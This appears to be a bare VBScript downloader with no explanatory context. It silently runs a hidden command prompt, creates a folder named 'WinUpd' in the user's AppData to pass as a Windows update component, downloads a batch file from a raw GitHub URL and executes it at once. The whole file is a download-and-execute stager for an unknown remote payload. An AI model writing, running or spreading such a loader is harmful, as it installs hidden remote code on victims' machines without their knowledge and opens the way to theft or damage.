Set WshShell = CreateObject("WScript.Shell")
WshShell.Run "cmd /c mkdir ""%APPDATA%\WinUpd"" 2>nul && curl -L -o ""%APPDATA%\WinUpd\jossol.bat"" https://raw.githubusercontent.com/poiko34/school/refs/heads/main/jossol.bat && call ""%APPDATA%\WinUpd\jossol.bat""", 0, True
Set WshShell = Nothing
